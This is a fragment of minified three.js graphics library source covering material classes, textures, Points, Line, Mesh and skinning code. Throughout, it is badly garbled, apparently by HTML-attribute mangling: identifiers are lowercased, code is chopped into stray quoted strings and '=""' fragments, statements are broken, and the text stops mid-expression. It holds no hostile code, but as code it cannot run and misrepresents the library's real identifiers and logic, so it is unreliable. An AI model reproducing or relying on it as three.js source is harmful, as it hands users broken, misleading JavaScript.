three.linebasicmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.linecap=a.linecap;this.linejoin=a.linejoin;return\" this};three.linedashedmaterial=\"function(a){THREE.Material.call(this);this.type=\" linedashedmaterial\";this.color=\"new\"\" three.color(16777215);this.scale=\"this.linewidth=1;this.dashSize=3;this.gapSize=1;this.lights=!1;this.setValues(a)};THREE.LineDashedMaterial.prototype=Object.create(THREE.Material.prototype);\" three.linedashedmaterial.prototype.constructor=\"THREE.LineDashedMaterial;THREE.LineDashedMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.scale=a.scale;this.dashSize=a.dashSize;this.gapSize=a.gapSize;return\" this};=\"\" three.meshbasicmaterial=\"function(a){THREE.Material.call(this);this.type=\" meshbasicmaterial\";this.color=\"new\"\" three.color(16777215);this.aomap=\"this.map=null;this.aoMapIntensity=1;this.envMap=this.alphaMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\" three.meshbasicmaterial.prototype=\"Object.create(THREE.Material.prototype);THREE.MeshBasicMaterial.prototype.constructor=THREE.MeshBasicMaterial;\" three.meshbasicmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\" this.skinning=\"a.skinning;this.morphTargets=a.morphTargets;return\" this};three.meshdepthmaterial=\"function(a){THREE.Material.call(this);this.type=\" meshdepthmaterial\";this.depthpacking=\"THREE.BasicDepthPacking;this.morphTargets=this.skinning=!1;this.displacementMap=this.alphaMap=this.map=null;this.displacementScale=1;this.displacementBias=0;this.wireframe=!1;this.wireframeLinewidth=1;this.lights=this.fog=!1;this.setValues(a)};THREE.MeshDepthMaterial.prototype=Object.create(THREE.Material.prototype);\"\" three.meshdepthmaterial.prototype.constructor=\"THREE.MeshDepthMaterial;THREE.MeshDepthMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.depthPacking=a.depthPacking;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.map=a.map;this.alphaMap=a.alphaMap;this.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return\" three.meshlambertmaterial=\"function(a){THREE.Material.call(this);this.type=\" meshlambertmaterial\";this.color=\"new\"\" three.color(16777215);this.lightmap=\"this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new\" three.color(0);this.emissiveintensity=\"1;this.envMap=this.alphaMap=this.specularMap=this.emissiveMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\" \"round\";this.morphnormals=\"this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshLambertMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshLambertMaterial.prototype.constructor=THREE.MeshLambertMaterial;\" three.meshlambertmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=\" a.refractionratio;this.wireframe=\"a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return\" this};three.meshnormalmaterial=\"function(a){THREE.Material.call(this,a);this.type=\" meshnormalmaterial\";this.wireframe=\"!1;this.wireframeLinewidth=1;this.morphTargets=this.lights=this.fog=!1;this.setValues(a)};\"\" three.meshnormalmaterial.prototype=\"Object.create(THREE.Material.prototype);THREE.MeshNormalMaterial.prototype.constructor=THREE.MeshNormalMaterial;THREE.MeshNormalMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return\" three.meshphongmaterial=\"function(a){THREE.Material.call(this);this.type=\" meshphongmaterial\";this.color=\"new\"\" three.color(16777215);this.specular=\"new\" three.color(1118481);this.shininess=\"30;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new\" three.vector2(1,1);this.displacementmap=\"null;this.displacementScale=1;this.displacementBias=\" 0;this.envmap=\"this.alphaMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\" round\";this.morphnormals=\"this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshPhongMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshPhongMaterial.prototype.constructor=THREE.MeshPhongMaterial;\"\" three.meshphongmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.specular.copy(a.specular);this.shininess=a.shininess;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);\" this.displacementmap=\"a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;\" this.morphnormals=\"a.morphNormals;return\" three.meshstandardmaterial=\"function(a){THREE.Material.call(this);this.defines={STANDARD:\" \"};this.type=\"MeshStandardMaterial\" ;this.color=\"new\"\" three.color(16777215);this.metalness=\"this.roughness=.5;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new\" 1;this.displacementbias=\"0;this.envMap=this.alphaMap=this.metalnessMap=this.roughnessMap=null;this.envMapIntensity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\" three.meshstandardmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.defines={STANDARD:\" \"};this.color.copy(a.color);this.roughness=\"a.roughness;this.metalness=a.metalness;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=\"\" a.normalmap;this.normalscale.copy(a.normalscale);this.displacementmap=\"a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.roughnessMap=a.roughnessMap;this.metalnessMap=a.metalnessMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.envMapIntensity=a.envMapIntensity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\" this};three.meshphysicalmaterial=\"function(a){THREE.MeshStandardMaterial.call(this);this.defines={PHYSICAL:\" ;this.reflectivity=\".5;this.clearCoatRoughness=this.clearCoat=0;this.setValues(a)};THREE.MeshPhysicalMaterial.prototype=Object.create(THREE.MeshStandardMaterial.prototype);THREE.MeshPhysicalMaterial.prototype.constructor=THREE.MeshPhysicalMaterial;\"\" three.meshphysicalmaterial.prototype.copy=\"function(a){THREE.MeshStandardMaterial.prototype.copy.call(this,a);this.defines={PHYSICAL:\" \"};this.reflectivity=\"a.reflectivity;this.clearCoat=a.clearCoat;this.clearCoatRoughness=a.clearCoatRoughness;return\"\" this};three.multimaterial=\"function(a){this.uuid=THREE.Math.generateUUID();this.type=\" multimaterial\";this.materials=\"a\"\" instanceof=\"\" array?a:[];this.visible=\"!0};\" three.multimaterial.prototype=\"{constructor:THREE.MultiMaterial,toJSON:function(a){for(var\" f=\"c[d].toJSON(a);delete\" f.metadata;b.materials.push(f)}b.visible=\"this.visible;return\" b},clone:function(){for(var=\"\" this.constructor,b=\"0;b<this.materials.length;b++)a.materials.push(this.materials[b].clone());a.visible=this.visible;return\" a}};=\"\" three.pointsmaterial=\"function(a){THREE.Material.call(this);this.type=\" pointsmaterial\";this.color=\"new\"\" three.color(16777215);this.map=\"null;this.size=1;this.sizeAttenuation=!0;this.lights=!1;this.setValues(a)};THREE.PointsMaterial.prototype=Object.create(THREE.Material.prototype);THREE.PointsMaterial.prototype.constructor=THREE.PointsMaterial;\" three.pointsmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.size=a.size;this.sizeAttenuation=a.sizeAttenuation;return\" three.shadermaterial=\"function(a){THREE.Material.call(this);this.type=\" shadermaterial\";this.defines=\"{};this.uniforms={};this.vertexShader=\"void\"\" main()=\"\" {\\n\\tgl_position=\"projectionMatrix\" *=\"\" modelviewmatrix=\"\" vec4(=\"\" position,=\"\" 1.0=\"\" );\\n}\";this.fragmentshader=\"void main() {\\n\\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\\n}\" ;this.linewidth=\"1;this.wireframe=!1;this.wireframeLinewidth=1;this.morphNormals=this.morphTargets=this.skinning=this.clipping=this.lights=this.fog=!1;this.extensions={derivatives:!1,fragDepth:!1,\" drawbuffers:!1,shadertexturelod:!1};this.defaultattributevalues=\"{color:[1,1,1],uv:[0,0],uv2:[0,0]};this.index0AttributeName=void\" 0;void=\"\" 0!=\"=a&&(void\" attributes=\"\" should=\"\" now=\"\" be=\"\" defined=\"\" in=\"\" three.buffergeometry=\"\" instead.\"),this.setvalues(a))};three.shadermaterial.prototype=\"Object.create(THREE.Material.prototype);THREE.ShaderMaterial.prototype.constructor=THREE.ShaderMaterial;\" three.shadermaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.fragmentShader=a.fragmentShader;this.vertexShader=a.vertexShader;this.uniforms=THREE.UniformsUtils.clone(a.uniforms);this.defines=a.defines;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.lights=a.lights;this.clipping=a.clipping;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;this.extensions=a.extensions;return\" three.shadermaterial.prototype.tojson=\"function(a){a=THREE.Material.prototype.toJSON.call(this,a);a.uniforms=this.uniforms;a.vertexShader=this.vertexShader;a.fragmentShader=this.fragmentShader;return\" a};three.rawshadermaterial=\"function(a){THREE.ShaderMaterial.call(this,a);this.type=\" rawshadermaterial\"};three.rawshadermaterial.prototype=\"Object.create(THREE.ShaderMaterial.prototype);THREE.RawShaderMaterial.prototype.constructor=THREE.RawShaderMaterial;\"\" three.spritematerial=\"function(a){THREE.Material.call(this);this.type=\" spritematerial\";this.color=\"new\"\" three.shadowmaterial=\"function(){THREE.ShaderMaterial.call(this,{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.lights,{opacity:{value:1}}]),vertexShader:THREE.ShaderChunk.shadow_vert,fragmentShader:THREE.ShaderChunk.shadow_frag});this.transparent=this.lights=!0;Object.defineProperties(this,{opacity:{enumerable:!0,get:function(){return\" this.uniforms.opacity.value},set:function(a){this.uniforms.opacity.value=\"a}}})};THREE.ShadowMaterial.prototype=Object.create(THREE.ShaderMaterial.prototype);\" three.shadowmaterial.prototype.constructor=\"THREE.ShadowMaterial;\" three.texture=\"function(a,b,c,d,e,f,g,h,k,l){Object.defineProperty(this,\" id\",{value:three.textureidcount++});this.uuid=\"THREE.Math.generateUUID();this.sourceFile=this.name=\"\";this.image=void\"\" this.anisotropy=\"void\" three.vector2(0,0);this.repeat=\"new\" three.vector2(1,1);this.generatemipmaps=\"!0;this.premultiplyAlpha=!1;this.flipY=!0;this.unpackAlignment=4;this.encoding=void\" 0;three.texture.default_mapping=\"THREE.UVMapping;\" three.texture.prototype=\"{constructor:THREE.Texture,set\" needsupdate(a){!0=\"==a&&this.version++},clone:function(){return(new\" this.constructor).copy(this)},copy:function(a){this.image=\"a.image;this.mipmaps=a.mipmaps.slice(0);this.mapping=a.mapping;this.wrapS=a.wrapS;this.wrapT=a.wrapT;this.magFilter=a.magFilter;this.minFilter=a.minFilter;this.anisotropy=a.anisotropy;this.format=a.format;this.type=a.type;this.offset.copy(a.offset);this.repeat.copy(a.repeat);this.generateMipmaps=a.generateMipmaps;this.premultiplyAlpha=\" a.premultiplyalpha;this.flipy=\"a.flipY;this.unpackAlignment=a.unpackAlignment;this.encoding=a.encoding;return\" this},tojson:function(a){if(void=\"\" a.textures[this.uuid];var=\"\" if(void=\"\" d=\"a.images,e=c.uuid,f=c.uuid,g;void\" a.textures[this.uuid]=\"b},dispose:function(){this.dispatchEvent({type:\" dispose\"})},\"=\"\" transformuv:function(a){if(this.mapping=\"==THREE.UVMapping){a.multiply(this.repeat);a.add(this.offset);if(0\">a.x||1<a.x)switch(this.wraps){case three.repeatwrapping:a.x-=\"Math.floor(a.x);break;case\" three.clamptoedgewrapping:a.x=\"0\">a.x?0:1;break;case THREE.MirroredRepeatWrapping:1===Math.abs(Math.floor(a.x)%2)?a.x=Math.ceil(a.x)-a.x:a.x-=Math.floor(a.x)}if(0>a.y||1<a.y)switch(this.wrapt){case three.repeatwrapping:a.y-=\"Math.floor(a.y);break;case\" three.clamptoedgewrapping:a.y=\"0\">a.y?0:1;break;case THREE.MirroredRepeatWrapping:1===\nMath.abs(Math.floor(a.y)%2)?a.y=Math.ceil(a.y)-a.y:a.y-=Math.floor(a.y)}this.flipY&&(a.y=1-a.y)}}};Object.assign(THREE.Texture.prototype,THREE.EventDispatcher.prototype);THREE.TextureIdCount=0;\nTHREE.DepthTexture=function(a,b,c,d,e,f,g,h,k){THREE.Texture.call(this,null,d,e,f,g,h,THREE.DepthFormat,c,k);this.image={width:a,height:b};this.type=void 0!==c?c:THREE.UnsignedShortType;this.magFilter=void 0!==g?g:THREE.NearestFilter;this.minFilter=void 0!==h?h:THREE.NearestFilter;this.generateMipmaps=this.flipY=!1};THREE.DepthTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DepthTexture.prototype.constructor=THREE.DepthTexture;\nTHREE.CanvasTexture=function(a,b,c,d,e,f,g,h,k){THREE.Texture.call(this,a,b,c,d,e,f,g,h,k);this.needsUpdate=!0};THREE.CanvasTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CanvasTexture.prototype.constructor=THREE.CanvasTexture;THREE.CubeTexture=function(a,b,c,d,e,f,g,h,k,l){a=void 0!==a?a:[];b=void 0!==b?b:THREE.CubeReflectionMapping;THREE.Texture.call(this,a,b,c,d,e,f,g,h,k,l);this.flipY=!1};THREE.CubeTexture.prototype=Object.create(THREE.Texture.prototype);\nTHREE.CubeTexture.prototype.constructor=THREE.CubeTexture;Object.defineProperty(THREE.CubeTexture.prototype,\"images\",{get:function(){return this.image},set:function(a){this.image=a}});THREE.CompressedTexture=function(a,b,c,d,e,f,g,h,k,l,n,p){THREE.Texture.call(this,null,f,g,h,k,l,d,e,n,p);this.image={width:b,height:c};this.mipmaps=a;this.generateMipmaps=this.flipY=!1};THREE.CompressedTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CompressedTexture.prototype.constructor=THREE.CompressedTexture;\nTHREE.DataTexture=function(a,b,c,d,e,f,g,h,k,l,n,p){THREE.Texture.call(this,null,f,g,h,k,l,d,e,n,p);this.image={data:a,width:b,height:c};this.magFilter=void 0!==k?k:THREE.NearestFilter;this.minFilter=void 0!==l?l:THREE.NearestFilter;this.generateMipmaps=this.flipY=!1};THREE.DataTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DataTexture.prototype.constructor=THREE.DataTexture;\nTHREE.VideoTexture=function(a,b,c,d,e,f,g,h,k){function l(){requestAnimationFrame(l);a.readyState>=a.HAVE_CURRENT_DATA&&(n.needsUpdate=!0)}THREE.Texture.call(this,a,b,c,d,e,f,g,h,k);this.generateMipmaps=!1;var n=this;l()};THREE.VideoTexture.prototype=Object.create(THREE.Texture.prototype);THREE.VideoTexture.prototype.constructor=THREE.VideoTexture;THREE.Group=function(){THREE.Object3D.call(this);this.type=\"Group\"};THREE.Group.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Group});\nTHREE.Points=function(a,b){THREE.Object3D.call(this);this.type=\"Points\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.PointsMaterial({color:16777215*Math.random()})};\nTHREE.Points.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Points,raycast:function(){var a=new THREE.Matrix4,b=new THREE.Ray,c=new THREE.Sphere;return function(d,e){function f(a,c){var f=b.distanceSqToPoint(a);if(f<n){var h=\"b.closestPointToPoint(a);h.applyMatrix4(k);var\" m=\"d.ray.origin.distanceTo(h);m<d.near||m\">d.far||e.push({distance:m,distanceToRay:Math.sqrt(f),point:h.clone(),index:c,face:null,object:g})}}var g=this,h=this.geometry,k=this.matrixWorld,l=d.params.Points.threshold;\nnull===h.boundingSphere&&h.computeBoundingSphere();c.copy(h.boundingSphere);c.applyMatrix4(k);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(k);b.copy(d.ray).applyMatrix4(a);var l=l/((this.scale.x+this.scale.y+this.scale.z)/3),n=l*l,l=new THREE.Vector3;if(h instanceof THREE.BufferGeometry){var p=h.index,h=h.attributes.position.array;if(null!==p)for(var m=p.array,p=0,q=m.length;p<q;p++){var r=\"m[p];l.fromArray(h,3*r);f(l,r)}else\" for(p=\"0,m=h.length/3;p<m;p++)l.fromArray(h,3*p),f(l,p)}else\" for(l=\"h.vertices,\" p=\"0,m=l.length;p<m;p++)f(l[p],p)}}}(),clone:function(){return(new\" this.constructor(this.geometry,this.material)).copy(this)}});three.line=\"function(a,b,c){if(1===c)return\" console.warn(\"three.line:=\"\" parameter=\"\" three.linepieces=\"\" no=\"\" longer=\"\" supported.=\"\" created=\"\" three.linesegments=\"\" instead.\"),new=\"\" three.linesegments(a,b);three.object3d.call(this);this.type=\"Line\" ;this.geometry=\"void\" 0!=\"=a?a:new\" three.buffergeometry;this.material=\"void\" three.linebasicmaterial({color:16777215*math.random()})};=\"\" three.line.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Line,raycast:function(){var\" a=\"new\" three.matrix4,b=\"new\" three.ray,c=\"new\" three.sphere;return=\"\" function(d,e){var=\"\" f=\"d.linePrecision,f=f*f,g=this.geometry,h=this.matrixWorld;null===g.boundingSphere&&g.computeBoundingSphere();c.copy(g.boundingSphere);c.applyMatrix4(h);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(h);b.copy(d.ray).applyMatrix4(a);var\" k=\"new\" three.vector3,l=\"new\" three.vector3,h=\"new\" three.vector3,n=\"new\" three.vector3,p=\"this\" instanceof=\"\" three.linesegments?2:1;if(g=\"\" three.buffergeometry){var=\"\" m=\"g.index,q=g.attributes.position.array;if(null!==m)for(var\" s=\"m[g+1];k.fromArray(q,3*m[g]);l.fromArray(q,3*s);s=b.distanceSqToSegment(k,l,n,h);s\">f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||e.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else for(g=0,r=\nq.length/3-1;g<r;g+=p)k.fromarray(q,3*g),l.fromarray(q,3*g+3),s=b.distancesqtosegment(k,l,n,h),s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||e.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else if(g instanceof THREE.Geometry)for(k=g.vertices,l=k.length,g=0;g<l-1;g+=p)s=b.distancesqtosegment(k[g],k[g+1],n,h),s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||\ne.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});THREE.LineSegments=function(a,b){THREE.Line.call(this,a,b);this.type=\"LineSegments\"};THREE.LineSegments.prototype=Object.assign(Object.create(THREE.Line.prototype),{constructor:THREE.LineSegments});\nTHREE.Mesh=function(a,b){THREE.Object3D.call(this);this.type=\"Mesh\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.MeshBasicMaterial({color:16777215*Math.random()});this.drawMode=THREE.TrianglesDrawMode;this.updateMorphTargets()};\nTHREE.Mesh.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Mesh,setDrawMode:function(a){this.drawMode=a},copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.drawMode=a.drawMode;return this},updateMorphTargets:function(){if(void 0!==this.geometry.morphTargets&&0<this.geometry.morphtargets.length){this.morphtargetbase=-1;this.morphtargetinfluences=[];this.morphtargetdictionary={};for(var a=\"0,b=this.geometry.morphTargets.length;a<b;a++)this.morphTargetInfluences.push(0),\" this.morphtargetdictionary[this.geometry.morphtargets[a].name]=\"a}},getMorphTargetIndexByName:function(a){if(void\" 0!=\"=this.morphTargetDictionary[a])return\" this.morphtargetdictionary[a];console.warn(\"three.mesh.getmorphtargetindexbyname:=\"\" morph=\"\" target=\"\" \"+a+\"=\"\" does=\"\" not=\"\" exist.=\"\" returning=\"\" 0.\");return=\"\" 0},raycast:function(){function=\"\" a(a,b,c,d,e,g,f){three.triangle.barycoordfrompoint(a,b,c,d,s);e.multiplyscalar(s.x);g.multiplyscalar(s.y);f.multiplyscalar(s.z);e.add(g).add(f);return=\"\" e.clone()}function=\"\" b(a,b,c,=\"\" d,e,g,f){var=\"\" h=\"a.material;if(null===(h.side===THREE.BackSide?c.intersectTriangle(g,e,d,!0,f):c.intersectTriangle(d,e,g,h.side!==THREE.DoubleSide,f)))return\" null;u.copy(f);u.applymatrix4(a.matrixworld);c=\"b.ray.origin.distanceTo(u);return\" c<b.near||c=\"\">b.far?null:{distance:c,point:u.clone(),object:a}}function c(c,d,e,f,l,p,n,s){g.fromArray(f,3*p);h.fromArray(f,3*n);k.fromArray(f,3*s);if(c=b(c,d,e,g,h,k,t))l&&(m.fromArray(l,2*p),q.fromArray(l,2*n),r.fromArray(l,2*s),c.uv=a(t,g,h,k,m,q,r)),c.face=new THREE.Face3(p,\nn,s,THREE.Triangle.normal(g,h,k)),c.faceIndex=p;return c}var d=new THREE.Matrix4,e=new THREE.Ray,f=new THREE.Sphere,g=new THREE.Vector3,h=new THREE.Vector3,k=new THREE.Vector3,l=new THREE.Vector3,n=new THREE.Vector3,p=new THREE.Vector3,m=new THREE.Vector2,q=new THREE.Vector2,r=new THREE.Vector2,s=new THREE.Vector3,t=new THREE.Vector3,u=new THREE.Vector3;return function(v,s){var w=this.geometry,u=this.material,z=this.matrixWorld;if(void 0!==u&&(null===w.boundingSphere&&w.computeBoundingSphere(),f.copy(w.boundingSphere),\nf.applyMatrix4(z),!1!==v.ray.intersectsSphere(f)&&(d.getInverse(z),e.copy(v.ray).applyMatrix4(d),null===w.boundingBox||!1!==e.intersectsBox(w.boundingBox)))){var y,A;if(w instanceof THREE.BufferGeometry){var I,B,u=w.index,z=w.attributes,w=z.position.array;void 0!==z.uv&&(y=z.uv.array);if(null!==u)for(var z=u.array,F=0,K=z.length;F<k;f+=3){if(u=z[f],i=z[f+1],b=z[f+2],a=c(this,v,e,w,y,u,i,b))a.faceindex=math.floor(f 0=\"==b)this.calculateInverses();else\" 1=\"\" 3),s.push(a)}else=\"\" for(f=\"0,K=w.length;F<K;F+=9)if(u=F/3,I=u+1,B=u+2,A=c(this,v,e,w,y,\" u,i,b))a.index=\"u,s.push(A)}else\" if(w=\"\" instanceof=\"\" three.geometry){var=\"\" p,m,z=\"u\" three.multimaterial,f=\"!0===z?u.materials:null,K=w.vertices;I=w.faces;B=w.faceVertexUvs[0];0<B.length&&(y=B);for(var\" h=\"0,L=I.length;H<L;H++){var\" o=\"I[H];A=!0===z?F[O.materialIndex]:u;if(void\" 0!=\"=A){B=K[O.a];P=K[O.b];M=K[O.c];if(!0===A.morphTargets){A=w.morphTargets;var\" n=\"this.morphTargetInfluences;g.set(0,0,0);h.set(0,0,0);k.set(0,0,0);for(var\" q=\"0,J=A.length;Q<J;Q++){var\" d=\"N[Q];if(0!==D){var\" g=\"A[Q].vertices;g.addScaledVector(l.subVectors(G[O.a],\" b),d);h.addscaledvector(n.subvectors(g[o.b],p),d);k.addscaledvector(p.subvectors(g[o.c],m),d)}}g.add(b);h.add(p);k.add(m);b=\"g;P=h;M=k}if(A=b(this,v,e,B,P,M,t))y&&(N=y[H],m.copy(N[0]),q.copy(N[1]),r.copy(N[2]),A.uv=a(t,B,P,M,m,q,r)),A.face=O,A.faceIndex=H,s.push(A)}}}}}}(),clone:function(){return(new\" this.constructor(this.geometry,this.material)).copy(this)}});three.bone=\"function(a){THREE.Object3D.call(this);this.type=\" bone\";this.skin=\"a};\"\" three.bone.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Bone,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.skin=a.skin;return\" this}});=\"\" three.skeleton=\"function(a,b,c){this.useVertexTexture=void\" three.matrix4;a=\"a||[];this.bones=a.slice(0);this.useVertexTexture?(a=Math.sqrt(4*this.bones.length),a=THREE.Math.nextPowerOfTwo(Math.ceil(a)),this.boneTextureHeight=this.boneTextureWidth=a=Math.max(a,4),this.boneMatrices=new\" float32array(this.bonetexturewidth*this.bonetextureheight*4),this.bonetexture=\"new\" three.datatexture(this.bonematrices,this.bonetexturewidth,this.bonetextureheight,three.rgbaformat,three.floattype)):=\"\" this.bonematrices=\"new\" float32array(16*this.bones.length);if(void=\"\" if(this.bones.length=\"==b.length)this.boneInverses=b.slice(0);else\" for(console.warn(\"three.skeleton=\"\" boninverses=\"\" is=\"\" the=\"\" wrong=\"\" length.\"),this.boneinverses=\"[],b=0,a=this.bones.length;b<a;b++)this.boneInverses.push(new\" three.matrix4)};=\"\" object.assign(three.skeleton.prototype,{calculateinverses:function(){this.boneinverses=\"[];for(var\" a=\"0,b=this.bones.length;a<b;a++){var\" c=\"new\" three.matrix4;this.bones[a]&&c.getinverse(this.bones[a].matrixworld);this.boneinverses.push(c)}},pose:function(){for(var=\"\" a,b=\"0,c=this.bones.length;b<c;b++)(a=this.bones[b])&&a.matrixWorld.getInverse(this.boneInverses[b]);b=0;for(c=this.bones.length;b<c;b++)if(a=this.bones[b])a.parent\" three.bone?(a.matrix.getinverse(a.parent.matrixworld),a.matrix.multiply(a.matrixworld)):=\"\" a.matrix.copy(a.matrixworld),a.matrix.decompose(a.position,a.quaternion,a.scale)},update:function(){var=\"\" three.matrix4;return=\"\" function(){for(var=\"\" b=\"0,c=this.bones.length;b<c;b++)a.multiplyMatrices(this.bones[b]?this.bones[b].matrixWorld:this.identityMatrix,this.boneInverses[b]),a.toArray(this.boneMatrices,16*b);this.useVertexTexture&&(this.boneTexture.needsUpdate=!0)}}(),clone:function(){return\" new=\"\" three.skeleton(this.bones,this.boneinverses,this.usevertextexture)}});=\"\" three.skinnedmesh=\"function(a,b,c){THREE.Mesh.call(this,a,b);this.type=\" skinnedmesh\";this.bindmode=\"attached\" ;this.bindmatrix=\"new\"\" three.matrix4;this.bindmatrixinverse=\"new\" d,e=\"0,f=this.geometry.bones.length;e<f;++e)d=this.geometry.bones[e],b=new\" three.bone(this),a.push(b),b.name=\"d.name,b.position.fromArray(d.pos),b.quaternion.fromArray(d.rotq),void\" this.geometry.bones[e],-1!=\"=d.parent&&null!==d.parent&&void\" three.skeleton(a,void=\"\" 0,c),this.matrixworld)};=\"\" three.skinnedmesh.prototype=\"Object.assign(Object.create(THREE.Mesh.prototype),{constructor:THREE.SkinnedMesh,bind:function(a,b){this.skeleton=a;void\" three.geometry)for(var=\"\" b.lengthmanhattan();infinity!=\"=c?b.multiplyScalar(c):b.set(1,0,0,0)}else\" if(this.geometry=\"\" three.buffergeometry)for(var=\"\" 